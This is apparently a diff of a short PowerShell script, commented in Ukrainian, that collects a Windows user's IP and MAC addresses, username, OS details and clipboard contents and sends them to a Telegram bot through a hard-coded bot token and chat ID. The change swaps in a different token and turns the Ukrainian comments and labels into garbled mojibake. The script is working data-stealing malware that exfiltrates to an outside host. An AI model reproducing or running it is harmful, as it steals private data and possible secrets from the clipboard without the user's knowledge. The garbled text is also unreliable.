@@ -1,24 +1,24 @@
-# Отримуємо інформацію про операційну систему
+# РћС‚СЂРёРјСѓС”РјРѕ С–РЅС„РѕСЂРјР°С†С–СЋ РїСЂРѕ РѕРїРµСЂР°С†С–Р№РЅСѓ СЃРёСЃС‚РµРјСѓ
 $os = Get-CimInstance -ClassName Win32_OperatingSystem
 
-# Отримуємо IP-адресу, MAC-адресу та ім'я користувача
+# РћС‚СЂРёРјСѓС”РјРѕ IP-Р°РґСЂРµСЃСѓ, MAC-Р°РґСЂРµСЃСѓ С‚Р° С–Рј'СЏ РєРѕСЂРёСЃС‚СѓРІР°С‡Р°
 $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.AddressState -eq 'Preferred'}).IPAddress
 $macAddress = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).MacAddress
 $userName = [System.Environment]::UserName
 $clipboardContent = Get-Clipboard
 
-# Формуємо текст повідомлення
+# Р¤РѕСЂРјСѓС”РјРѕ С‚РµРєСЃС‚ РїРѕРІС–РґРѕРјР»РµРЅРЅСЏ
 $message = @"
-IP адреса: $ipAddress
-MAC адреса: $macAddress
-Назва користувача: $userName
-Версія Windows: $($os.Caption)
-Архітектура ОС: $($os.OSArchitecture)
-В буфері обміну: $clipboardContent
+IP Р°РґСЂРµСЃР°: $ipAddress
+MAC Р°РґСЂРµСЃР°: $macAddress
+РќР°Р·РІР° РєРѕСЂРёСЃС‚СѓРІР°С‡Р°: $userName
+Р’РµСЂСЃС–СЏ Windows: $($os.Caption)
+РђСЂС…С–С‚РµРєС‚СѓСЂР° РћРЎ: $($os.OSArchitecture)
+Р’ Р±СѓС„РµСЂС– РѕР±РјС–РЅСѓ: $clipboardContent
 "@
 
-# Відправляємо повідомлення через Telegram Bot API
-Invoke-RestMethod -Uri "https://api.telegram.org/bot8082747013:AAGap4vyzOdAI7BIzsx16qhS5_n3kXXw_rA/sendMessage" `
+# Р’С–РґРїСЂР°РІР»СЏС”РјРѕ РїРѕРІС–РґРѕРјР»РµРЅРЅСЏ С‡РµСЂРµР· Telegram Bot API
+Invoke-RestMethod -Uri "https://api.telegram.org/bot7269680347:AAElwpxygcNsIQxcUI44OvtqN2L-NIIDyPA/sendMessage" `
                   -Method Post `
                   -ContentType "application/x-www-form-urlencoded" `
                   -Body @{chat_id="6039088675"; text=$message}
